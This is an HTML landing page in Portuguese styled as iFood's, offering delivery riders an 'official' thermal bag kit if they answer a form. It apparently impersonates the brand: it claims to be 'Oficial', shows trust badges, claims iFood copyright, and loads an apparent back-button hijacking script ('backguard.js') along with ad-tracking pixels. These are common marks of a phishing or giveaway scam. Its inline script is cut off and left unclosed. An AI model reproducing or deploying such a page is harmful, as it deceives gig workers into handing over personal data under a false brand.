<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Kit Oficial</title>
    <meta name="description" content="Responda o formulário e verifique a elegibilidade para receber o kit parceiro iFood.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css?v=3.0">
    <script src="/backguard.js?v=1.1"></script>
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

<script>
        window.pixelId = "69879d3cc070d5501c7e3fde";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");

<body data-page="home">
    

    <header class="header">
        <div class="logo-container">
            <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step fade-in-up" aria-hidden="false">
            <div class="badge-container">
                <span class="badge">Oficial</span>
            </div>

            <h1>Bolsa iFood Oficial</h1>
            <p>Responda o formulário para verificar se você é qualificado para receber o kit parceiro em casa.</p>

            <div class="hero-image">
                <img src="assets/bagfoto-home.webp" alt="Mochila iFood" loading="eager" decoding="async"
                    fetchpriority="high">
            </div>

            <div class="benefits">
                <div class="benefit-item">Térmica</div>
                <div class="benefit-item">Impermeável</div>
                <div class="benefit-item">Expansível</div>
            </div>

            <div class="action-stack">
                <button id="btn-start" class="btn-primary" type="button">Quero participar</button>
            </div>

            <div class="trust-strip trust-strip--cards">
                <div class="trust-card">
                    <span class="trust-icon-wrap">
                        <img class="trust-icon-img" src="assets/envio-rastreado.webp" alt="Envio rastreado">
                    </span>
                    <span>Envio rastreado</span>
                </div>
                <div class="trust-card">
                    <span class="trust-icon-wrap">
                        <img class="trust-icon-img" src="assets/dados-protegidos.webp" alt="Dados protegidos">
                    </span>
                    <span>Dados protegidos</span>
                </div>
                <div class="trust-card">
                    <span class="trust-icon-wrap">
                        <img class="trust-icon-img" src="assets/processo-rapido.webp" alt="Processo rápido">
                    </span>
                    <span>Processo rápido</span>
                </div>
            </div>

        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js?v=5.8" defer></script>
</body>

</html>
